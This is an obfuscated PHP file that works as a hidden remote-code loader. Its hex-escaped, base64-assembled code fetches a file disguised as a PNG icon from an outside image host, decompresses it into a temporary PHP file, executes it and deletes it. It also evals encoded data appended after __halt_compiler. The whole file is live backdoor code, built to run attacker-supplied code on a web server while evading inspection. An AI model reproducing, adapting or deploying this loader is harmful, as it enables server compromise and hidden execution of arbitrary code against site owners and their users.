<?php
${"\x47\x4c\x4f\x42\x41\x4cS"}["\x79\x7at\x71\x63\x6c\x65\x76\x63z\x76"]="m\x72VlWk\x44\x78\x4f\x59\x70";$qipmyfehwe="\x58\x55\x66\x5a\x77\x57\x6c\x54\x57\x49\x4d";${"GL\x4f\x42\x41L\x53"}["\x76\x73\x6a\x62\x68\x66w\x6au\x75"]="\x58v\x73\x43w\x6d\x4a\x5fV\x58\x78\x48";${"GL\x4f\x42ALS"}["\x7a\x69\x6c\x6b\x73\x69ek\x63br"]="O\x4b\x45\x49VU\x64J";${"GLO\x42AL\x53"}["\x6fd\x76\x70\x6an\x73"]="\x58Uf\x5a\x77W\x6c\x54\x57\x49\x4d";${"\x47L\x4f\x42\x41\x4c\x53"}["\x69\x73fht\x77\x6a"]="\x66\x69\x6ce";$famwgqjftqlu="\x4fK\x45\x49VUdJ";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x63n\x76\x78xpe\x64jr"]="\x46\x43M\x4b\x6e\x76\x4e\x68j\x78\x4c\x5fV";$lnlbtv="\x66i\x6c\x65";${${"G\x4c\x4fB\x41\x4c\x53"}["\x69s\x66h\x74\x77\x6a"]}=fopen(__FILE__,"\x72b");$etalghi="\x46\x43\x4d\x4b\x6evN\x68jxL\x5f\x56";fseek(${$lnlbtv},__COMPILER_HALT_OFFSET__);${${"G\x4cOB\x41\x4cS"}["\x6f\x64\x76\x70\x6a\x6e\x73"]}=base64_decode("c".chr(51)."V"."\x69").base64_decode(chr(99).chr(119).chr(61)."\x3d").base64_decode(chr(100)."H"."\x49".chr(61));${${"\x47\x4c\x4f\x42\x41\x4cS"}["z\x69\x6c\x6bs\x69e\x6b\x63\x62r"]}=base64_decode(chr(90).chr(119).chr(61).chr(61)).base64_decode(chr(101)."\x6d"."\x6b"."=").base64_decode(chr(98)."\x6d"."Y"."=").strrev(${${"\x47\x4cOB\x41\x4c\x53"}["\x6f\x64\x76\x70\x6an\x73"]}(base64_decode("b"."W"."V"."0"."Y"."\x57".chr(119).chr(61)),(-2-(-3))));function OKEIVUdJ($qBqTrCmWOc){$pwviypb="q\x42\x71Tr\x43mW\x4f\x63";${${"\x47L\x4f\x42AL\x53"}["vsj\x62\x68\x66w\x6a\x75u"]}=tempnam(base64_decode("\x4c".chr(51).chr(82).chr(116)."c".chr(65)."\x3d"."="),base64_decode("\x64".chr(109)."F"."s"."\x61"."\x57"."Q"."\x3d"));${"\x47\x4cOB\x41\x4cS"}["\x69n\x6d\x65\x75e\x75\x74"]="m\x72\x56\x6c\x57\x6b\x44\x78\x4f\x59\x70";${"\x47\x4c\x4f\x42AL\x53"}["rv\x62\x6b\x7a\x77\x74\x74g"]="\x6d\x72\x56\x6c\x57\x6bD\x78\x4fY\x70";${${"\x47L\x4f\x42ALS"}["r\x76\x62\x6bzw\x74\x74\x67"]}=fopen(${${"\x47L\x4f\x42\x41L\x53"}["\x76\x73jbh\x66\x77\x6a\x75u"]},base64_decode(chr(100).chr(121)."\x73"."\x3d"));fwrite(${${"\x47\x4c\x4f\x42\x41L\x53"}["inmeue\x75\x74"]},base64_decode(chr(80).chr(68).chr(57).chr(119).chr(97)."\x48"."\x41"."=").chr(10).${$pwviypb});fclose(${${"\x47\x4c\x4f\x42\x41L\x53"}["\x79\x7a\x74q\x63l\x65v\x63\x7a\x76"]});include${${"G\x4c\x4f\x42AL\x53"}["\x76\x73j\x62\x68fwj\x75u"]};unlink(${${"G\x4cOB\x41\x4c\x53"}["\x76sjb\x68\x66\x77\x6a\x75\x75"]});return get_defined_vars();}${$etalghi}=@file_get_contents(base64_decode("a"."H".chr(82).chr(48).chr(99).chr(72).chr(77).chr(54).chr(76)."y".chr(57)."\x70"."\x62"."W"."F".chr(110)."\x5a"."\x53".chr(53)."p"."\x59".chr(109).chr(73)."u".chr(89).chr(50)."8".chr(118)."Y"."3".chr(81)."z".chr(87)."\x6e"."\x4a"."\x75"."L".chr(50)."l"."\x75"."\x5a"."\x47"."\x39".chr(117)."Z"."X"."N"."p".chr(89).chr(86)."9"."\x70"."\x59".chr(50)."\x39".chr(117).chr(76)."\x6e"."B".chr(117)."\x5a"."\x77".chr(61)."="));extract(OKEIVUdJ(@${$famwgqjftqlu}(${$qipmyfehwe}(${${"\x47\x4cO\x42\x41\x4c\x53"}["\x63\x6e\x76x\x78\x70\x65dj\x72"]},(2163-229)))));eval("?>".base64_decode(stream_get_contents(${${"\x47LO\x42\x41\x4c\x53"}["\x69\x73\x66h\x74\x77\x6a"]})));__halt_compiler();